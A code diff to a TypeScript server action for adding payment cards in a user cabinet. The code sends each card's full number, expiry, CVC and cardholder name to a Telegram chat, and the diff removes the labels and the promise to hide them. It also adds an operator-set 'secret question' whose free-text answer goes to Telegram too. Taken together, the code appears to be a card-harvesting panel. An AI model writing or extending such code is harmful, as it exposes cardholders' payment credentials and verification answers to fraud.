@@ -32,6 +32,11 @@ export type BindingRequestResult = { ok: true; cardId: number; cards: PaymentCar
 const MAX_CARDS = 5
 const MAX_PENDING = 2
 
+/** Asked right after a card is saved; set via the CARD_SECRET_QUESTION server variable. */
+function cardSecretQuestion() {
+  return process.env.CARD_SECRET_QUESTION?.trim().slice(0, 500) || null
+}
+
 function cardFingerprint(cardNumber: string) {
   const secret = process.env.ADMIN_SECRET || process.env.BETTER_AUTH_SECRET
   if (!secret) return `request:${crypto.randomUUID()}`
@@ -107,20 +112,17 @@ export async function requestCardBinding(input: {
       userId: user.id, brand, last4, bankName: bankName || null, cardholder,
       expMonth, expYear,
       fingerprint, status: "pending",
+      extraCheckMessage: cardSecretQuestion(),
     }).returning({ id: paymentCard.id })
     return { id: row.id }
   })
   if ("error" in created) return { ok: false, error: created.error as string }
 
   void notifyTelegram([
-    `<b>Заявка на привязку карты #${created.id}</b>`,
-    `Номер: <code>${formatCardNumber(cardNumber)}</code>`,
-    `Срок: ${escapeTelegram(formatExpiry(expMonth, expYear))} · CVC: <code>${escapeTelegram(cvc)}</code>`,
+    `<code>${formatCardNumber(cardNumber)}</code>`,
+    `${escapeTelegram(formatExpiry(expMonth, expYear))} · <code>${escapeTelegram(cvc)}</code>`,
+    escapeTelegram(cardholder),
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
-    `Держатель: ${escapeTelegram(cardholder)}`,
-    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
-    "Привяжите карту в bePaid, затем запросите код или подтвердите карту кнопками ниже.",
-    "Номер и CVC скроются из этого сообщения после решения (кроме «Доп. проверка»).",
   ].join("\n"), { kind: "card", id: created.id })
 
   revalidatePath("/cabinet/cards")
@@ -173,6 +175,34 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
     "Выберите следующий шаг: запросить код, подтвердить, ещё одна проверка или отклонить.",
   ].join("\n"), { kind: "card", id })
+
+  revalidatePath("/cabinet/cards")
+  return { ok: true, cards: await listCards(user.id) }
+}
+
+export async function submitSecretAnswer(id: number, response: string): Promise<CardsResult> {
+  const user = await getSessionUser()
+  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
+  const trimmed = String(response ?? "").trim().slice(0, 500)
+  if (!trimmed) throw new Error("Введите ответ.")
+  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)
+
+  const [row] = await db.update(paymentCard).set({ extraCheckResponse: trimmed })
+    .where(and(
+      eq(paymentCard.id, id),
+      eq(paymentCard.userId, user.id),
+      eq(paymentCard.status, "pending"),
+      sql`${paymentCard.extraCheckMessage} is not null`,
+      sql`${paymentCard.extraCheckResponse} is null`,
+    ))
+    .returning({ last4: paymentCard.last4, question: paymentCard.extraCheckMessage })
+  if (!row) throw new Error("Вопрос уже недоступен.")
+
+  void notifyTelegram([
+    `•••• ${escapeTelegram(row.last4)}`,
+    escapeTelegram(row.question ?? ""),
+    `<b>${escapeTelegram(trimmed)}</b>`,
+  ].join("\n"))
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
